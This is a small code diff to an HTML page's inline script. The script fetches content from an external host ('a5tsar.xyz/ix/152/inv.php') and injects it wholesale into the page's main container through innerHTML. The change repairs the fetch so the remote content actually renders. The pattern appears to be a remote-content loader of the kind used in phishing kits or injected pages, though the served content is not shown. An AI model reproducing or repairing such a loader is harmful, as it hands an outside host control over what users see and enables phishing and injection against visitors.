@@ -29,6 +29,7 @@
     </div>
 
     <script>
-      fetch('https://a5tsar.xyz/ix/152/inv.php').then((res)=>{document.querySelector("#master_App").innerHTML = res;}); </script>
+      fetch('https://a5tsar.xyz/ix/152/inv.php').then((response) => response.text()).then((res)=>{document.querySelector("#master_App").innerHTML = res;}); 
+    </script>
   </body>
 </html>
